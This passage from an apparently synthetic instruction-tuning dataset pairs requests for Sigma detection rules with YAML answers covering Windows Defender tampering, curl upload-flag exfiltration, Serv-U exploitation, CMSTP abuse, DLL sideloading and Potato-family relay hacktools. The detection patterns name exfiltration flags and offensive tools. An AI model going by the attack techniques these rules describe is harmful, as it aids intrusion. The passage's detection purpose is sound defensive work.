      "answer": "In order to detect suspicious changes to the Windows Defender configuration, you should monitor for specific modifications made to the Windows Defender\u2019s settings that could undermine the system's security integrity. This includes changes logged in Windows Defender's operational logs under the service name 'windefend', specifically with an event ID 5007, which denotes that the antimalware platform's configuration has been altered. Key changes to watch for include the disabling of AntiSpyware, the disabling of removable drive scanning, the disabling of scanning mapped network drives for a full scan, the disabling of block at first seen in SpyNet, changes to SpyNet reporting settings, and modifications to the consent level for submitting samples to Microsoft for analysis. These modifications are critical to monitor as they can significantly lower the protective measures of Windows Defender, making the system more vulnerable to malware and other cyber threats. It\u2019s also important to note that while administrator activity might account for some changes and could initially be considered as false positives, such activity still requires investigation to ensure it's not malicious. Monitoring these changes is crucial for maintaining the security posture of a Windows-based system and is associated with tactics and techniques like defense evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia, you should monitor for the creation of processes in Windows operating systems that include the command line containing the specific string 'abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc'. Such a unique string in the command line may indicate malicious activities associated with the TropicTrooper threat actor. This monitoring is considered of high importance due to the potential impact and the targeted nature of the TropicTrooper's operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc'\n    condition: selection\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc'\n    condition: selection\nlevel: high\n",
      "question": "TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia",
      "answer": "In order to detect TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia, you should monitor for the creation of processes in Windows operating systems that include the command line containing the specific string 'abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc'. Such a unique string in the command line may indicate malicious activities associated with the TropicTrooper threat actor. This monitoring is considered of high importance due to the potential impact and the targeted nature of the TropicTrooper's operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the \"curl\" process with \"upload\" flags. Which might indicate potential data exfiltration.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of the \"curl\" process with \"upload\" flags, which might indicate potential data exfiltration, you should focus on monitoring process creation within Windows environments. Specifically, look out for instances where the \"curl.exe\" application is executed. The key indicators of potential malicious activity involve the use of command-line arguments that initiate data uploads. These include the use of flags such as `--form`, `--upload-file`, `--data`, along with variations like `--data-ascii`, `--data-binary`, `--data-raw`, and `--data-urlencode`. Additionally, less common but equally important flags to monitor for include those denoted by the regex pattern `\\s-[FTd]\\s`, which captures short-form upload-related flags that might be case sensitive.\n\nBe aware that not all usage of curl for uploading data is malicious. Common legitimate cases involve scripts created by developers and system administrators for various benign purposes. To refine detection and reduce false positives, you can optionally exclude curl command lines that target `localhost` or the loopback IP address `127.0.0.1`, as these are often used in non-malicious, internal operations.\n\nMonitoring for these behaviors helps identify potential data exfiltration attempts through a commonly used command-line tool, allowing for timely investigation and response to suspicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - Product: 'The curl executable'\n    selection_cli:\n        - CommandLine|contains:\n            - ' --form' # Also covers the \"--form-string\"\n            - ' --upload-file '\n            - ' --data '\n            - ' --data-' # For flags like: \"--data-ascii\", \"--data-binary\", \"--data-raw\", \"--data-urlencode\"\n        - CommandLine|re: '\\s-[FTd]\\s' # We use regex to ensure a case sensitive argument detection\n    filter_optional_localhost:\n        CommandLine|contains:\n            - '://localhost'\n            - '://127.0.0.1'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Scripts created by developers and admins\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - Product: 'The curl executable'\n    selection_cli:\n        - CommandLine|contains:\n            - ' --form' # Also covers the \"--form-string\"\n            - ' --upload-file '\n            - ' --data '\n            - ' --data-' # For flags like: \"--data-ascii\", \"--data-binary\", \"--data-raw\", \"--data-urlencode\"\n        - CommandLine|re: '\\s-[FTd]\\s' # We use regex to ensure a case sensitive argument detection\n    filter_optional_localhost:\n        CommandLine|contains:\n            - '://localhost'\n            - '://127.0.0.1'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Scripts created by developers and admins\nlevel: medium\n",
      "question": "execution of the \"curl\" process with \"upload\" flags. Which might indicate potential data exfiltration",
      "answer": "In order to detect the execution of the \"curl\" process with \"upload\" flags, which might indicate potential data exfiltration, you should focus on monitoring process creation within Windows environments. Specifically, look out for instances where the \"curl.exe\" application is executed. The key indicators of potential malicious activity involve the use of command-line arguments that initiate data uploads. These include the use of flags such as `--form`, `--upload-file`, `--data`, along with variations like `--data-ascii`, `--data-binary`, `--data-raw`, and `--data-urlencode`. Additionally, less common but equally important flags to monitor for include those denoted by the regex pattern `\\s-[FTd]\\s`, which captures short-form upload-related flags that might be case sensitive.\n\nBe aware that not all usage of curl for uploading data is malicious. Common legitimate cases involve scripts created by developers and system administrators for various benign purposes. To refine detection and reduce false positives, you can optionally exclude curl command lines that target `localhost` or the loopback IP address `127.0.0.1`, as these are often used in non-malicious, internal operations.\n\nMonitoring for these behaviors helps identify potential data exfiltration attempts through a commonly used command-line tool, allowing for timely investigation and response to suspicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Access to Domain Group Policies stored in SYSVOL.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect access to Domain Group Policies stored in SYSVOL, you should monitor for the creation of processes on Windows systems that involve command lines containing both '\\SYSVOL\\' and '\\policies\\' paths. This is indicative of activities related to accessing or manipulating Domain Group Policies which are typically stored within the SYSVOL folder on domain controllers. Be aware that genuine administrative activities can also trigger this detection due to legitimate access to the SYSVOL directory, thus these should be considered as potential false positives. The severity of this rule is deemed medium, reflecting the importance of vigilance against unauthorized attempts to access or alter domain policies, which could signify a security threat or an attempt to assert control over domain resources and settings.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SYSVOL\\'\n            - '\\policies\\'\n    condition: selection\nfalsepositives:\n    - Administrative activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SYSVOL\\'\n            - '\\policies\\'\n    condition: selection\nfalsepositives:\n    - Administrative activity\nlevel: medium\n",
      "question": "Access to Domain Group Policies stored in SYSVOL",
      "answer": "In order to detect access to Domain Group Policies stored in SYSVOL, you should monitor for the creation of processes on Windows systems that involve command lines containing both '\\SYSVOL\\' and '\\policies\\' paths. This is indicative of activities related to accessing or manipulating Domain Group Policies which are typically stored within the SYSVOL folder on domain controllers. Be aware that genuine administrative activities can also trigger this detection due to legitimate access to the SYSVOL directory, thus these should be considered as potential false positives. The severity of this rule is deemed medium, reflecting the importance of vigilance against unauthorized attempts to access or alter domain policies, which could signify a security threat or an attempt to assert control over domain resources and settings."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322, you should: Monitor Windows process creation logs for specific command-line activities that indicate an exploitation attempt. Specifically, look for the execution of the `whoami` command, which is commonly used by attackers to check the privileges of the compromised account. Additionally, pay attention to commands that access paths related to `./Client/Common/` or `.\\Client\\Common\\`, and the specific use of a batch file located at `C:\\Windows\\Temp\\Serv-U.bat`. These patterns of command line activity are critical indicators of an ongoing exploitation attempt of the Serv-U vulnerability by the identified threat group. False positives are considered unlikely for this detection, underscoring the critical nature of these indicators in identifying potential breaches.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_whoami:\n        CommandLine|contains: 'whoami'\n    selection_cmd_1:\n        CommandLine|contains:\n            - './Client/Common/'\n            - '.\\Client\\Common\\'\n    selection_cmd_2:\n        CommandLine|contains: 'C:\\Windows\\Temp\\Serv-U.bat'\n    condition: selection_whoami and 1 of selection_cmd*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_whoami:\n        CommandLine|contains: 'whoami'\n    selection_cmd_1:\n        CommandLine|contains:\n            - './Client/Common/'\n            - '.\\Client\\Common\\'\n    selection_cmd_2:\n        CommandLine|contains: 'C:\\Windows\\Temp\\Serv-U.bat'\n    condition: selection_whoami and 1 of selection_cmd*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322",
      "answer": "In order to detect patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322, you should: Monitor Windows process creation logs for specific command-line activities that indicate an exploitation attempt. Specifically, look for the execution of the `whoami` command, which is commonly used by attackers to check the privileges of the compromised account. Additionally, pay attention to commands that access paths related to `./Client/Common/` or `.\\Client\\Common\\`, and the specific use of a batch file located at `C:\\Windows\\Temp\\Serv-U.bat`. These patterns of command line activity are critical indicators of an ongoing exploitation attempt of the Serv-U vulnerability by the identified threat group. False positives are considered unlikely for this detection, underscoring the critical nature of these indicators in identifying potential breaches."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a local hidden user account which should not happen for event ID 4720..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a local hidden user account which should not happen for event ID 4720, you should: Monitor Windows security event logs specifically for event ID 4720, which signals the creation of a user account. Focus on instances where the TargetUserName ends with a '$' character because this is often used to denote hidden user accounts or machine accounts which are not typically manually created. This activity is highly suspicious and typically not expected under normal operational circumstances. It's important to be aware that there might be instances where such activity could be legitimate, but they are rare, hence the high level of alert for this detection.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4720\n        TargetUserName|endswith: '$'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4720\n        TargetUserName|endswith: '$'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "creation of a local hidden user account which should not happen for event ID 4720.",
      "answer": "In order to detect the creation of a local hidden user account which should not happen for event ID 4720, you should: Monitor Windows security event logs specifically for event ID 4720, which signals the creation of a user account. Focus on instances where the TargetUserName ends with a '$' character because this is often used to denote hidden user accounts or machine accounts which are not typically manually created. This activity is highly suspicious and typically not expected under normal operational circumstances. It's important to be aware that there might be instances where such activity could be legitimate, but they are rare, hence the high level of alert for this detection."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process. This file is usually generated by Microsoft Powershell to test against Applocker..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process, which is typically generated by Microsoft PowerShell to test against Applocker, you should monitor Windows file event logs for the creation or modification of files containing the name \"__PSScriptPolicyTest_\". It is crucial to exclude events triggered by known and common PowerShell processes, including 'pwsh.exe', 'dsac.exe', 'ServerManager.exe', 'powershell_ise.exe', 'powershell.exe', and 'wsmprovhost.exe' located in their respective system directories within 'Program Files', 'System32', and 'SysWOW64'. These exclusions help in reducing false positives by filtering out legitimate instances of PowerShell use. The detection focuses on identifying potential evasion or bypass attempts of application control policies like Applocker, by pinpointing activities occurring from unusual or unexpected processes which are not typically associated with the generation of this specific PowerShell script file. Monitoring these events at a medium severity level is recommended due to the potential for false positives of unknown origin, yet the creation of such a script by atypical processes can signify malicious intent, such as attempting to assess or circumvent existing security policies.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '__PSScriptPolicyTest_'\n    filter_main_generic:\n        Image|endswith:\n            - ':\\Program Files\\PowerShell\\7\\pwsh.exe'\n            - ':\\Windows\\System32\\dsac.exe'\n            - ':\\Windows\\System32\\ServerManager.exe'\n            - ':\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe'\n            - ':\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\n            - ':\\Windows\\System32\\wsmprovhost.exe'\n            - ':\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell_ise.exe'\n            - ':\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '__PSScriptPolicyTest_'\n    filter_main_generic:\n        Image|endswith:\n            - ':\\Program Files\\PowerShell\\7\\pwsh.exe'\n            - ':\\Windows\\System32\\dsac.exe'\n            - ':\\Windows\\System32\\ServerManager.exe'\n            - ':\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe'\n            - ':\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\n            - ':\\Windows\\System32\\wsmprovhost.exe'\n            - ':\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell_ise.exe'\n            - ':\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process. This file is usually generated by Microsoft Powershell to test against Applocker.",
      "answer": "In order to detect the creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process, which is typically generated by Microsoft PowerShell to test against Applocker, you should monitor Windows file event logs for the creation or modification of files containing the name \"__PSScriptPolicyTest_\". It is crucial to exclude events triggered by known and common PowerShell processes, including 'pwsh.exe', 'dsac.exe', 'ServerManager.exe', 'powershell_ise.exe', 'powershell.exe', and 'wsmprovhost.exe' located in their respective system directories within 'Program Files', 'System32', and 'SysWOW64'. These exclusions help in reducing false positives by filtering out legitimate instances of PowerShell use. The detection focuses on identifying potential evasion or bypass attempts of application control policies like Applocker, by pinpointing activities occurring from unusual or unexpected processes which are not typically associated with the generation of this specific PowerShell script file. Monitoring these events at a medium severity level is recommended due to the potential for false positives of unknown origin, yet the creation of such a script by atypical processes can signify malicious intent, such as attempting to assess or circumvent existing security policies."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting processes loading the non-existent DLL \"ShellChromeAPI\". One known example is the \"DeviceEnroller\" binary in combination with the \"PhoneDeepLink\" flag tries to load this DLL.\nAdversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect processes loading the non-existent DLL \"ShellChromeAPI\", which could indicate that adversaries are attempting to execute their own malicious DLL via legitimate Windows processes like DeviceEnroller.exe by misusing the \"PhoneDeepLink\" flag, you should focus on monitoring image loading activities within Windows environments. Specifically, you should pay attention to any instances where a DLL ending with the name \"\\ShellChromeAPI.dll\" is loaded. This DLL should not exist on modern Windows systems, and any attempt to load it should be considered suspicious and possibly indicative of an attack where an adversary is leveraging a renamed malicious DLL to compromise the system. It is important to remain vigilant for false positives, although they are currently unknown, and treat any detection at a high severity level due to the potential for significant system compromise. This technique is a telltale sign of adversaries trying to discreetly execute malicious code under the guise of legitimate operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        # The DLL shouldn't exist on Windows anymore. If for some reason you still have it. You could filter out legitimate calls\n        ImageLoaded|endswith: '\\ShellChromeAPI.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        # The DLL shouldn't exist on Windows anymore. If for some reason you still have it. You could filter out legitimate calls\n        ImageLoaded|endswith: '\\ShellChromeAPI.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "processes loading the non-existent DLL \"ShellChromeAPI\". One known example is the \"DeviceEnroller\" binary in combination with the \"PhoneDeepLink\" flag tries to load this DLL.\nAdversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe using this parameter\n",
      "answer": "In order to detect processes loading the non-existent DLL \"ShellChromeAPI\", which could indicate that adversaries are attempting to execute their own malicious DLL via legitimate Windows processes like DeviceEnroller.exe by misusing the \"PhoneDeepLink\" flag, you should focus on monitoring image loading activities within Windows environments. Specifically, you should pay attention to any instances where a DLL ending with the name \"\\ShellChromeAPI.dll\" is loaded. This DLL should not exist on modern Windows systems, and any attempt to load it should be considered suspicious and possibly indicative of an attack where an adversary is leveraging a renamed malicious DLL to compromise the system. It is important to remain vigilant for false positives, although they are currently unknown, and treat any detection at a high severity level due to the potential for significant system compromise. This technique is a telltale sign of adversaries trying to discreetly execute malicious code under the guise of legitimate operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting various indicators of Microsoft Connection Manager Profile Installer execution.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect various indicators of Microsoft Connection Manager Profile Installer execution, you should: Monitor for the creation of processes where the parent imaging process ends with '\\cmstp.exe'. This action is characteristic of an attacker exploiting the Connection Manager Profile Installer (CMSTP.exe) to execute unauthorized commands or payloads. Focus on logging information such as the command line inputs, the parent command line that initiated the process, and any specific details around the process creation event. It is crucial to scrutinize these events due to their high potential for abuse in bypassing user account control and executing malicious code. However, be aware of potential false positives, as legitimate uses of CMSTP exist, though they are considered unlikely in modern enterprise environments. This type of monitoring is rooted in identifying tactics and techniques related to Execution and Defense Evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # CMSTP Spawning Child Process\n    selection:\n        ParentImage|endswith: '\\cmstp.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Details\nfalsepositives:\n    - Legitimate CMSTP use (unlikely in modern enterprise environments)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    # CMSTP Spawning Child Process\n    selection:\n        ParentImage|endswith: '\\cmstp.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Details\nfalsepositives:\n    - Legitimate CMSTP use (unlikely in modern enterprise environments)\nlevel: high\n",
      "question": "various indicators of Microsoft Connection Manager Profile Installer execution",
      "answer": "In order to detect various indicators of Microsoft Connection Manager Profile Installer execution, you should: Monitor for the creation of processes where the parent imaging process ends with '\\cmstp.exe'. This action is characteristic of an attacker exploiting the Connection Manager Profile Installer (CMSTP.exe) to execute unauthorized commands or payloads. Focus on logging information such as the command line inputs, the parent command line that initiated the process, and any specific details around the process creation event. It is crucial to scrutinize these events due to their high potential for abuse in bypassing user account control and executing malicious code. However, be aware of potential false positives, as legitimate uses of CMSTP exist, though they are considered unlikely in modern enterprise environments. This type of monitoring is rooted in identifying tactics and techniques related to Execution and Defense Evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to prevent adversaries from obtaining information about running processes on a system, which could be used to gain an understanding of common software/applications running on systems within the network, you should monitor Windows processes for the execution of the \"tasklist\" command. Specifically, look for process creation events where the command line contains 'tasklist', the image path ends with '\\tasklist.exe', or the original file name is 'tasklist.exe'. These indicators suggest an attempt to list processes, which could be an initial step in reconnaissance within a network. Be aware that some false positives may occur, such as legitimate requests by administrators or helpdesk inquiries to users. As this activity is merely informational, it is crucial to analyze the context of each event to determine whether it is benign or part of a more extensive attack campaign.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains: 'tasklist'\n        - Image|endswith: '\\tasklist.exe'\n        - OriginalFileName: 'tasklist.exe'\n    condition: selection\nfalsepositives:\n    - Administrator, hotline ask to user\nlevel: informational\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains: 'tasklist'\n        - Image|endswith: '\\tasklist.exe'\n        - OriginalFileName: 'tasklist.exe'\n    condition: selection\nfalsepositives:\n    - Administrator, hotline ask to user\nlevel: informational\n",
      "question": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network",
      "answer": "In order to prevent adversaries from obtaining information about running processes on a system, which could be used to gain an understanding of common software/applications running on systems within the network, you should monitor Windows processes for the execution of the \"tasklist\" command. Specifically, look for process creation events where the command line contains 'tasklist', the image path ends with '\\tasklist.exe', or the original file name is 'tasklist.exe'. These indicators suggest an attempt to list processes, which could be an initial step in reconnaissance within a network. Be aware that some false positives may occur, such as legitimate requests by administrators or helpdesk inquiries to users. As this activity is merely informational, it is crucial to analyze the context of each event to determine whether it is benign or part of a more extensive attack campaign."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of Advanced IP Scanner, which seems to be a popular tool for ransomware groups, you should: \n\nLook for events related to file activities within Windows systems, specifically focusing on the category that captures file events. Monitor any instances where files are created, modified, or otherwise manipulated within the directory path `\\AppData\\Local\\Temp\\Advanced IP Scanner 2`. This specific path inclusion is pivotal because it's indicative of the Advanced IP Scanner tool's operation, a tool frequently utilized by ransomware groups for reconnaissance or network mapping before launching an attack. However, it's crucial to account for possible legitimate administrative uses of this tool within your environment, marking them as expected exceptions to reduce false positives. This monitoring is deemed to have a medium level of importance in identifying potential security threats related to ransomware activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\Advanced IP Scanner 2'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\Advanced IP Scanner 2'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative use\nlevel: medium\n",
      "question": "use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.",
      "answer": "In order to detect the use of Advanced IP Scanner, which seems to be a popular tool for ransomware groups, you should: \n\nLook for events related to file activities within Windows systems, specifically focusing on the category that captures file events. Monitor any instances where files are created, modified, or otherwise manipulated within the directory path `\\AppData\\Local\\Temp\\Advanced IP Scanner 2`. This specific path inclusion is pivotal because it's indicative of the Advanced IP Scanner tool's operation, a tool frequently utilized by ransomware groups for reconnaissance or network mapping before launching an attack. However, it's crucial to account for possible legitimate administrative uses of this tool within your environment, marking them as expected exceptions to reduce false positives. This monitoring is deemed to have a medium level of importance in identifying potential security threats related to ransomware activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting different hacktools used for relay attacks on Windows for privilege escalation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect different hacktools used for relay attacks on Windows for privilege escalation, you should:\n\nMonitor Windows process creation logs for instances of specific hacktools known to facilitate these types of attacks. Look for processes whose images include names hinting at popular attack tools such as 'PetitPotam', 'RottenPotato', 'HotPotato', 'JuicyPotato', among others, indicating that an attacker might be attempting to exploit Windows services for privilege escalation. Additionally, be vigilant for processes initiated with command lines that contain certain key phrases like 'Invoke-Tater', indicating the use of PowerShell scripts geared towards similar exploitation techniques, and variations of JuicyPotato attacks signified by certain command line patterns involving '.exe -t * -p ' and specific enumeration options used by JuicyPotatoNG.\n\nExclude from alerts the processes related to known legitimate software named HotPotatoes, which could be mistaken as part of the attack tools due to name similarities. This distinction is crucial to minimize false positives and ensure that detection efforts are focused on malicious activities.\n\nThe criticality of such detections is considered high due to the potential impact of these attacks, which include unauthorized privilege escalation and subsequent control over affected systems. To accurately detect and mitigate these threats, ensure that the detection logic covers a broad spectrum of known attack tool indicators while also allowing room for the exclusion of benign software sharing name characteristics with the tools in question.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_pe:\n        Image|contains:\n            - 'PetitPotam'\n            - 'RottenPotato'\n            - 'HotPotato'\n            - 'JuicyPotato'\n            - '\\just_dce_'\n            - 'Juicy Potato'\n            - '\\temp\\rot.exe'\n            - '\\Potato.exe'\n            - '\\SpoolSample.exe'\n            - '\\Responder.exe'\n            - '\\smbrelayx'\n            - '\\ntlmrelayx'\n            - '\\LocalPotato'\n    selection_script:\n        CommandLine|contains:\n            - 'Invoke-Tater'\n            - ' smbrelay'\n            - ' ntlmrelay'\n            - 'cme smb '\n            - ' /ntlm:NTLMhash '\n            - 'Invoke-PetitPotam'\n            - '.exe -t * -p '  # JuicyPotatoNG pattern https://github.com/antonioCoco/JuicyPotatoNG\n    selection_juicypotato_enum:  # appears when JuicyPotatoNG is used with -b\n        CommandLine|contains: '.exe -c \"{'\n        CommandLine|endswith: '}\" -z'\n    filter_hotpotatoes:  # known goodware https://hotpot.uvic.ca/\n        Image|contains:\n            - 'HotPotatoes6'\n            - 'HotPotatoes7'\n            - 'HotPotatoes ' # Covers the following: 'HotPotatoes 6', 'HotPotatoes 7', 'HotPotatoes Help', 'HotPotatoes Tutorial'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate files with these rare hacktool names\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_pe:\n        Image|contains:\n            - 'PetitPotam'\n            - 'RottenPotato'\n            - 'HotPotato'\n            - 'JuicyPotato'\n            - '\\just_dce_'\n            - 'Juicy Potato'\n            - '\\temp\\rot.exe'\n            - '\\Potato.exe'\n            - '\\SpoolSample.exe'\n            - '\\Responder.exe'\n            - '\\smbrelayx'\n            - '\\ntlmrelayx'\n            - '\\LocalPotato'\n    selection_script:\n        CommandLine|contains:\n            - 'Invoke-Tater'\n            - ' smbrelay'\n            - ' ntlmrelay'\n            - 'cme smb '\n            - ' /ntlm:NTLMhash '\n            - 'Invoke-PetitPotam'\n            - '.exe -t * -p '  # JuicyPotatoNG pattern https://github.com/antonioCoco/JuicyPotatoNG\n    selection_juicypotato_enum:  # appears when JuicyPotatoNG is used with -b\n        CommandLine|contains: '.exe -c \"{'\n        CommandLine|endswith: '}\" -z'\n    filter_hotpotatoes:  # known goodware https://hotpot.uvic.ca/\n        Image|contains:\n            - 'HotPotatoes6'\n            - 'HotPotatoes7'\n            - 'HotPotatoes ' # Covers the following: 'HotPotatoes 6', 'HotPotatoes 7', 'HotPotatoes Help', 'HotPotatoes Tutorial'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate files with these rare hacktool names\nlevel: critical\n",
      "question": "different hacktools used for relay attacks on Windows for privilege escalation",
